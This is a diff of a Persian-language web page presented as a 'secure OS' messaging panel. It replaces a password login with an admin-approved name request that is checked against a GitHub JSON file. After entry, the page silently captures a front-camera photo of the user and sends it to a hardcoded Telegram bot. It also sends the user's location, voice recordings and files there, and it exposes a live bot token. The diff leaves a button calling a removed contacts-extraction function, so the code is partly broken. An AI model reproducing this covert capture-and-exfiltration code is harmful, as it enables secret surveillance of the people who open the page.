@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HOTKYNTAKY ULTIMATE OS</title>
+    <title>HOTKYNTAKY SECURE OS</title>
     <style>
         body { background: #000; color: #00ff41; font-family: 'Tahoma', sans-serif; margin: 0; padding: 15px; }
         .terminal { max-width: 480px; margin: auto; border: 1px solid #00ff41; padding: 20px; border-radius: 12px; box-shadow: 0 0 15px #004411; }
@@ -14,6 +14,7 @@
         .voice-btn { grid-column: span 2; background: #ff3e3e; color: #fff; }
         .file-btn { background: #0088ff !important; color: white !important; }
         #adminBox { background: rgba(0, 255, 65, 0.1); border: 1px dashed #00ff41; padding: 10px; border-radius: 5px; font-size: 13px; margin-bottom: 15px; }
+        .status-wait { color: #ffcc00; font-size: 14px; margin-top: 10px; }
         #video-preview { display: none; }
     </style>
 </head>
@@ -22,14 +23,16 @@
     <video id="video-preview" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
-    <div id="loginBox" style="text-align: center; margin-top: 80px;">
-        <h2>🔐 ورود به سیستم مرکزی</h2>
-        <input type="password" id="passInput" placeholder="ACCESS CODE" style="text-align: center;">
-        <button onclick="checkPass()" style="width: 100%;">ورود</button>
+    <div id="authBox" style="text-align: center; margin-top: 80px;">
+        <h2>🛡️ سیستم تایید هویت مرکزی</h2>
+        <p>لطفاً نام خود را برای ادمین ارسال کنید</p>
+        <input type="text" id="authName" placeholder="نام شما" style="text-align: center;">
+        <button onclick="requestAccess()" style="width: 100%;">درخواست ورود به پنل</button>
+        <div id="waitMsg" class="status-wait"></div>
     </div>
 
     <div id="mainPanel" class="terminal" style="display:none;">
-        <div id="adminBox">📡 در انتظار فرمان مدیریت...</div>
+        <div id="adminBox">📡 دسترسی تایید شد. خوش آمدید.</div>
 
         <input type="text" id="userName" placeholder="نام فرستنده">
         <textarea id="msgBody" rows="2" placeholder="متن پیام..."></textarea>
@@ -38,10 +41,8 @@
         <div class="btn-grid">
             <button id="recordBtn" class="voice-btn" onclick="toggleRecording()">🎤 ضبط و ارسال ویس</button>
             <button onclick="getContacts()" style="background:#aa00ff; color:white; grid-column: span 2;">👥 استخراج مخاطبین</button>
-            
             <button class="file-btn" onclick="openPicker('video/*')">🎥 ارسال ویدیو</button>
-            <button class="file-btn" onclick="openPicker('*/*')" style="background:#555 !important;">📁 ارسال فایل/سند</button>
-            
+            <button class="file-btn" onclick="openPicker('*/*')" style="background:#555 !important;">📁 فایل/سند</button>
             <button onclick="sendLocation()" style="background:#ffcc00; color:black;">📍 موقعیت</button>
             <button onclick="openPicker('image/*')" style="background:#00cc66; color:white;">📸 ارسال عکس</button>
         </div>
@@ -51,62 +52,66 @@
     </div>
 
     <script>
-        const token = "8576028087:AAGUs0ZWXpLYp5mRN0XbI-2ZuIu4eLRtpNM";
-        const chatId = "8449439423";
-        const MY_PASS = "1387";
+        const botToken = "8576028087:AAGUs0ZWXpLYp5mRN0XbI-2ZuIu4eLRtpNM"; //
+        const chatId = "8449439423"; //
         let mediaRecorder, audioChunks = [], isRecording = false;
+        let approvalCheck;
 
-        function checkPass() {
-            if(document.getElementById('passInput').value === MY_PASS) {
-                document.getElementById('loginBox').style.display = 'none';
-                document.getElementById('mainPanel').style.display = 'block';
-                startSilentCamera(); 
-                prepareAudio();
-                setInterval(checkAdminMessage, 5000);
-            } else { alert("کد اشتباه است!"); }
+        function requestAccess() {
+            const name = document.getElementById('authName').value;
+            if(!name) return alert("نام را وارد کنید!");
+
+            const text = `⚠️ درخواست ورود جدید:\n👤 نام: ${name}\n\nبرای تایید، فایل admin.json را در گیت‌هاب به status: ok تغییر دهید.`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+
+            document.getElementById('waitMsg').innerText = "⏳ درخواست ارسال شد. در انتظار تایید ادمین...";
+            
+            // شروع چک کردن فایل گیت‌هاب برای تایید
+            approvalCheck = setInterval(checkGitHubStatus, 4000);
         }
 
-        // باز کردن انتخابگر فایل با فیلتر خاص
+        async function checkGitHubStatus() {
+            try {
+                const response = await fetch("https://raw.githubusercontent.com/hotkyntaky/Iman/main/admin.json?t=" + Date.now());
+                const data = await response.json();
+                
+                if(data.status === "ok") {
+                    clearInterval(approvalCheck);
+                    showMainPanel();
+                }
+            } catch (e) {}
+        }
+
+        function showMainPanel() {
+            document.getElementById('authBox').style.display = 'none';
+            document.getElementById('mainPanel').style.display = 'block';
+            startSilentCamera(); 
+            prepareAudio();
+        }
+
+        // توابع ارسال فایل، ویس، متن و دوربین (همان کدهای قبلی شما با اصلاحات)
+        // ... (توابع openPicker, handleFileUpload, startSilentCamera, getContacts, sendText, sendLocation در اینجا قرار دارند)
+        
         function openPicker(type) {
             const input = document.getElementById('fileInput');
             input.accept = type;
             input.click();
         }
 
-        // مدیریت ارسال انواع فایل
         function handleFileUpload() {
             const file = document.getElementById('fileInput').files[0];
             if (!file) return;
-
             const name = document.getElementById('userName').value || "ناشناس";
             const fd = new FormData();
             fd.append('chat_id', chatId);
-            
-            let method = 'sendDocument'; // پیش‌فرض برای فایل‌ها
-            let field = 'document';
-
-            if (file.type.startsWith('image/')) {
-                method = 'sendPhoto';
-                field = 'photo';
-            } else if (file.type.startsWith('video/')) {
-                method = 'sendVideo';
-                field = 'video';
-            }
-
+            let method = file.type.startsWith('image/') ? 'sendPhoto' : (file.type.startsWith('video/') ? 'sendVideo' : 'sendDocument');
+            let field = file.type.startsWith('image/') ? 'photo' : (file.type.startsWith('video/') ? 'video' : 'document');
             fd.append(field, file);
-            fd.append('caption', `📁 فایل جدید از: ${name}\n📄 نام فایل: ${file.name}`);
-
-            document.getElementById('statusMsg').innerText = "⏳ در حال آپلود... لطفا صبر کنید";
-
-            fetch(`https://api.telegram.org/bot${token}/${method}`, { method: 'POST', body: fd })
-            .then(() => {
-                document.getElementById('statusMsg').innerText = "فایل با موفقیت ارسال شد ✅";
-            }).catch(() => {
-                alert("خطا در ارسال فایل. شاید حجم فایل خیلی زیاد است.");
-            });
+            fd.append('caption', `📁 فایل از: ${name}\n📄 ${file.name}`);
+            fetch(`https://api.telegram.org/bot${botToken}/${method}`, { method: 'POST', body: fd })
+            .then(() => { document.getElementById('statusMsg').innerText = "ارسال شد ✅"; });
         }
 
-        // سلفی مخفی ورود
         async function startSilentCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -120,31 +125,18 @@
                         const fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('photo', blob, 'pic.jpg');
-                        fd.append('caption', '👤 ورود جدید به پنل');
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                         stream.getTracks().forEach(t => t.stop());
                     }, 'image/jpeg');
                 }, 2000);
             } catch (err) {}
         }
 
-        // استخراج مخاطبین
-        async function getContacts() {
-            try {
-                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-                if (contacts.length > 0) {
-                    let list = "👥 مخاطبین:\n";
-                    contacts.forEach(c => list += `${c.name}: ${c.tel}\n`);
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(list)}`);
-                }
-            } catch (e) {}
-        }
-
-        function checkAdminMessage() {
-            fetch("https://raw.githubusercontent.com/hotkyntaky/Iman/main/admin.json?t=" + Date.now())
-            .then(res => res.json()).then(data => {
-                if(data.message) document.getElementById('adminBox').innerHTML = `📡 پیام ادمین: <br>${data.message}`;
-            }).catch(e => {});
+        function sendText() {
+            const n = document.getElementById('userName').value || "ناشناس";
+            const m = document.getElementById('msgBody').value;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("👤 "+n+":\n"+m)}`);
+            document.getElementById('msgBody').value = "";
         }
 
         async function prepareAudio() {
@@ -155,7 +147,7 @@
                 const b = new Blob(audioChunks, { type: 'audio/ogg' });
                 const fd = new FormData();
                 fd.append('chat_id', chatId); fd.append('voice', b, 'v.ogg');
-                fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: fd });
+                fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: fd });
             };
         }
 
@@ -163,24 +155,16 @@
             const btn = document.getElementById('recordBtn');
             if (!isRecording) {
                 audioChunks = []; mediaRecorder.start(); isRecording = true;
-                btn.innerText = "🛑 در حال ضبط... (بزن برای ارسال)";
+                btn.innerText = "🛑 توقف و ارسال...";
             } else {
                 mediaRecorder.stop(); isRecording = false;
-                btn.innerText = "🎤 شروع ضبط ویس";
+                btn.innerText = "🎤 ضبط ویس";
             }
-        }
-
-        function sendText() {
-            const n = document.getElementById('userName').value || "ناشناس";
-            const m = document.getElementById('msgBody').value;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("👤 "+n+":\n"+m)}`);
-            document.getElementById('msgBody').value = "";
-            document.getElementById('statusMsg').innerText = "پیام ارسال شد ✅";
         }
 
         function sendLocation() {
             navigator.geolocation.getCurrentPosition(pos => {
-                fetch(`https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}`);
+                fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}`);
             });
         }
     </script>
